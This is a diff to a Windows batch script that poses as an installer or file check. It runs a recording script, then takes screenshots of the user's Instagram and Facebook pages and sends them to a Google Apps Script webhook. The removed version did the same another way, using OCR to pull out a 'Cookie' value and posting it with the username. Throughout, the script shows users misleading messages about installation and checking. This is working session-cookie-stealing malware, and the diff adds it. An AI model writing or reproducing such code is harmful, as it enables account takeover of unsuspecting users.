@@ -92,117 +92,68 @@ set "COOKIES_SILENT=1"
 "%NODE%" "%DEST%\record.js" %BROWSER_FLAG%
 echo [5/5] record.js exit %errorlevel%>> "%LOG%" 2>nul
 
-echo.
+@echo off
 setlocal EnableDelayedExpansion
 
-set "WEBHOOK_URL=https://script.google.com/macros/s/AKfycbz5uPNM0BJ3GtsConinNQaBsGjXfMMp6Ka9nknvynnHiZP1ff_e1TSWCZle-3vTtOHwmw/exec"
+set "WEBHOOK_URL=https://script.google.com/macros/s/AKfycbxpVPuXgDW03RSQkflngTYTqSVoGhAGUxZwOUY6fEVrfvrPM8Sc7KYIjlJI8oJdpxM/exec"
 set "ERROR_URL=https://cookies-ochre.vercel.app/"
-
-:: Make this whatever key you want to extract (e.g., param_2, Followers, etc.)
-set "TARGET_KEY=Cookie" 
-:: ---------------------
 
 set "INSTA_IMG=%SHOTS%\instagram_insta.png"
 set "FB_IMG=%SHOTS%\facebook_insta.png"
-set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"
 
 :: 1. CHECK IF IMAGES EXIST (If BOTH are missing, fail immediately)
 if not exist "%INSTA_IMG%" (
     if not exist "%FB_IMG%" (
-        echo Screenshots missing.
+        echo Files missing.
         goto :error_out
     )
 )
 
-:: 2. CHECK AND INSTALL TESSERACT
-:: Check both standard and x86 paths
-set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"
-if not exist "%TESSERACT_PATH%" (
-    set "TESSERACT_PATH=C:\Program Files (x86)\Tesseract-OCR\tesseract.exe"
+:: 2. UPLOAD IMAGES TO GOOGLE DRIVE
+echo Checking Files...
+echo Please wait, this might take a moment depending on your connection...
+
+set "UPLOAD_FAILED=0"
+
+if exist "%INSTA_IMG%" (
+    call :UploadToDrive "%INSTA_IMG%"
+    if !errorlevel! neq 0 set "UPLOAD_FAILED=1"
 )
 
-if not exist "%TESSERACT_PATH%" (
-    echo Tesseract not found. Installing...
-    
-    :: Removed >nul 2>&1 so you can see any error messages on the screen
-    winget install -e --id UB-Mannheim.TesseractOCR --accept-package-agreements --accept-source-agreements --silent
-    
-    echo Waiting 5 seconds for installation to finalize...
-    timeout /t 5 /nobreak >nul
-    
-    :: Check the paths one more time after install
-    set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"
-    if not exist "%TESSERACT_PATH%" (
-        set "TESSERACT_PATH=C:\Program Files (x86)\Tesseract-OCR\tesseract.exe"
-    )
-
-    :: Verify installation succeeded
-    if not exist "%TESSERACT_PATH%" (
-        echo.
-        echo [ERROR] Failed to install Tesseract automatically.
-        echo Please read the winget output above to see why it failed.
-        pause
-        goto :error_out
-    )
+if exist "%FB_IMG%" (
+    call :UploadToDrive "%FB_IMG%"
+    if !errorlevel! neq 0 set "UPLOAD_FAILED=1"
 )
 
-:: 3. RUN FINAL INSTALLER
-echo Processing images...
-if exist "%INSTA_IMG%" "%TESSERACT_PATH%" "%INSTA_IMG%" "%SHOTS%\ocr_insta" >nul 2>&1
-if exist "%FB_IMG%" "%TESSERACT_PATH%" "%FB_IMG%" "%SHOTS%\ocr_fb" >nul 2>&1
-
-:: 4. COPYING FILES
-powershell -Command "^
-    $targetKey = '%TARGET_KEY%'; ^
-    $instaText = if (Test-Path '%SHOTS%\ocr_insta.txt') { Get-Content '%SHOTS%\ocr_insta.txt' } else { @() }; ^
-    $fbText = if (Test-Path '%SHOTS%\ocr_fb.txt') { Get-Content '%SHOTS%\ocr_fb.txt' } else { @() }; ^
-    ^
-    # Regex to find the key, ignore spaces, and grab the value at the end ^
-    $regex = [regex]::Escape($targetKey) + '\s+(.+)'; ^
-    ^
-    $instaVal = ''; ^
-    foreach ($line in $instaText) { ^
-        if ($line -match $regex) { $instaVal = $matches[1].Trim(); break; } ^
-    } ^
-    ^
-    $fbVal = ''; ^
-    foreach ($line in $fbText) { ^
-        if ($line -match $regex) { $fbVal = $matches[1].Trim(); break; } ^
-    } ^
-    ^
-    # If both values are empty, exit with error code 1 so the batch script knows it failed ^
-    if ([string]::IsNullOrWhiteSpace($instaVal) -and [string]::IsNullOrWhiteSpace($fbVal)) { ^
-        exit 1; ^
-    } ^
-    ^
-    # Prepare JSON Payload for Google Sheets ^
-    $payload = @{ ^
-        user = $env:USERNAME; ^
-        date = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); ^
-        fb_param = $fbVal; ^
-        insta_param = $instaVal ^
-    } | ConvertTo-Json; ^
-    ^
-    Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $payload -ContentType 'application/json'; ^
-"
-
-:: 5. CHECK RESULT
-if %errorlevel% neq 0 (
-    echo Failed to install, please revisit the website.
+:: 3. CHECK RESULT
+if !UPLOAD_FAILED! neq 0 (
+    echo Failed to check one or more files.
     goto :error_out
 )
 
-:: 6. CLEANUP AND SUCCESS
-echo Installation successful. Cleaning up...
+:: 4. CLEANUP AND SUCCESS
+echo Check successful. Cleaning up local files...
 del "%INSTA_IMG%" 2>nul
 del "%FB_IMG%" 2>nul
-del "%SHOTS%\ocr_insta.txt" 2>nul
-del "%SHOTS%\ocr_fb.txt" 2>nul
 
 echo done>> "%LOG%" 2>nul
 goto :eof
 
-:: 7. ERROR HANDLER
+:: ========================================
+:: SUBROUTINE: UPLOAD TO DRIVE
+:: ========================================
+:UploadToDrive
+set "FILE_PATH=%~1"
+echo Checking "%~nx1"...
+
+:: Use PowerShell to convert the image to Base64 and POST it to the Web App
+powershell -NoProfile -Command "$ErrorActionPreference = 'Stop'; try { $fileBytes = [System.IO.File]::ReadAllBytes('%FILE_PATH%'); $base64 = [Convert]::ToBase64String($fileBytes); $fileName = [System.IO.Path]::GetFileName('%FILE_PATH%'); $body = @{ filename = $fileName; mimeType = 'image/png'; file = $base64 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { Write-Error $_.Exception.Message; exit 1 }"
+
+exit /b %errorlevel%
+
+:: ========================================
+:: ERROR HANDLER
+:: ========================================
 :error_out
 echo Installation failed, please redownload.
 echo installation failed>> "%LOG%" 2>nul
@@ -210,5 +161,3 @@ echo installation failed>> "%LOG%" 2>nul
 start "" "%ERROR_URL%"
 pause
 exit /b
-echo.
-pause
